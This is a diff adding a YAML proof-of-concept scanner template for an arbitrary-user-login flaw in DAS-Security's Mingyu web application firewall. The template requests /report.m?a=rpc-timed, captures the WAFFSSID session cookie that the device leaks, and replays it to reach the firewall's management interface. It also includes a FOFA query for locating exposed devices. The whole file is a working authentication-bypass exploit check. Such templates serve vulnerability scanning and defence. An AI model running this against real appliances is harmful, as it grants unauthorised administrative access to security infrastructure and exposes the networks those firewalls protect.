@@ -1,0 +1,22 @@
+id: poc-yaml-an-heng-ming-yu-waf-report-php-anyuser-login
+info:
+  name: 安恒 明御WEB应用防火墙 report.php 任意用户登录漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 安恒 明御WEB应用防火墙
+  fofa: app="安恒信息-明御WAF"
+requests:
+- method: GET
+  path: /report.m?a=rpc-timed
+  expression: status_code == 200 && contains(body,"error_0x110005")
+  output:
+  - regex_match(headers,"WAFFSSID=(?P<waffssid>[0-9a-z]+);")
+- method: GET
+  path: /
+  headers:
+    Cookie: WAFFSSID={{.waffssid}}
+  expression: "status_code == 200\n&& contains(body,\"日志\")\n&& contains(body,\"网络流量\"\
+    ) \n&& contains(title,\"明御WEB应用防火墙\")\n"
+variables: {}
+transport: http
